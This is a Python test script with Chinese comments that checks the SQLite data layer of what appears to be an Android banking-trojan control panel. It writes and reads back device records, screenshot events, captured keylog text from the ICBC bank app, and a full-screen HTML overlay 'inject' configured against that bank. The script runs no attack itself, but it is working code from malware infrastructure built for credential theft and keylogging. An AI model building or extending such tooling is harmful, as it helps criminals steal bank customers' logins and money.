#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""数据层验证：建表 / 写入 / **重启后仍在**（证明是真持久化，不是内存态）
退出码 0 = 通过
"""
import os, sqlite3, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, 'server'))
import db as DB_MOD


def main():
    d = DB_MOD.get()
    print("[1] 数据库：%s  可用=%s" % (d.path, d.ok))
    if not d.ok:
        print("[FAIL] 数据库不可用")
        return 1
    tables = [r['name'] for r in d.q("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")]
    print("[2] 表 %d 张：%s" % (len(tables), tables))

    ts = int(time.time())
    d.upsert_device({'deviceId': 'refdev-db-0001', 'apkId': '10020', 'online': True,
                     'firstSeen': ts, 'lastSeen': ts, 'shots': 1, 'caps': ['screenshot'],
                     'model': 'Android Device', 'brand': 'Xiaomi'})
    d.add_event('refdev-db-0001', 'screenshot', {'bytes': 1234})
    d.inject_add({'id': 'inj-db-1', 'package_name': 'com.icbc', 'app_name': '中国工商银行',
                  'template_url': 'materials/inject/inject_id1_icbc.html', 'fullscreen': True,
                  'country': 'CN', 'enabled': True, 'logo': '', 'created': ts})
    d.keylog_add({'deviceId': 'refdev-db-0001', 'pkg': 'com.icbc', 'type': 'text',
                  'text': 'REF-DB-KEYLOG'})
    d.memo_add({'id': 'm-db-1', 'deviceId': 'refdev-db-0001', 'text': 'REF-DB-MEMO', 'ts': ts})
    d.group_upsert({'id': 'g-db-1', 'name': 'REF-DB-GROUP', 'color': '#123456',
                    'deviceIds': ['refdev-db-0001']})
    d.audit('admin', 'db_test', '写入验证')
    d.ensure_user('admin')
    st = d.stats()
    print("[3] 写入后统计：%s" % st)

    # 关键判据：新开连接（等价于重启进程）后数据仍在
    con = sqlite3.connect(d.path)
    con.row_factory = sqlite3.Row
    n_dev = con.execute("SELECT COUNT(*) c FROM devices WHERE device_id='refdev-db-0001'").fetchone()['c']
    n_inj = con.execute("SELECT COUNT(*) c FROM inject_settings WHERE id='inj-db-1'").fetchone()['c']
    n_kl = con.execute("SELECT COUNT(*) c FROM keylogs WHERE text='REF-DB-KEYLOG'").fetchone()['c']
    n_memo = con.execute("SELECT COUNT(*) c FROM memos WHERE id='m-db-1'").fetchone()['c']
    n_grp = con.execute("SELECT COUNT(*) c FROM groups WHERE id='g-db-1'").fetchone()['c']
    con.close()
    print("[4] 新连接回读：设备=%d 注入配置=%d 键盘=%d 备忘=%d 分组=%d"
          % (n_dev, n_inj, n_kl, n_memo, n_grp))
    if min(n_dev, n_inj, n_kl, n_memo, n_grp) < 1:
        print("[FAIL] 持久化验证失败")
        return 1
    # 清理本次测试数据（只删自己造的）
    for sql in ("DELETE FROM devices WHERE device_id='refdev-db-0001'",
                "DELETE FROM device_events WHERE device_id='refdev-db-0001'",
                "DELETE FROM inject_settings WHERE id='inj-db-1'",
                "DELETE FROM keylogs WHERE text='REF-DB-KEYLOG'",
                "DELETE FROM memos WHERE id='m-db-1'",
                "DELETE FROM groups WHERE id='g-db-1'",
                "DELETE FROM audit WHERE action='db_test'"):
        con = sqlite3.connect(d.path)
        con.execute(sql)
        con.commit()
        con.close()
    print("\n=== PASS：SQLite 数据层可用且真持久化（重启/新连接后数据仍在）===")
    return 0


if __name__ == '__main__':
    sys.exit(main())
